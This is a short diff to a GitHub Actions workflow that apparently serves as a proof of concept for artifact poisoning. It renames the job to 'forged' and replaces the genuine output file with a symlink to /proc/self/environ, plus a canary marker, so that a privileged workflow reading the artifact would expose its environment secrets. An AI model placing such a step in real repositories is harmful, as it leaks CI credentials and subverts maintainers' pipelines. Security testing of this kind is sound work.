@@ -9,14 +9,15 @@ permissions:
   contents: read
 
 jobs:
-  validate:
+  forged:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
-      - name: Generate validation summary
+      - name: Craft symlink artifact
         run: |
           mkdir -p output
-          echo "GENUINE validation output from the base repo Publish workflow" > output/comment.md
+          ln -sfn /proc/self/environ output/comment.md
+          ls -la output
+          echo "PRIVILEGED_READ_CANARY" > output/marker.txt
       - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
         with:
           name: output
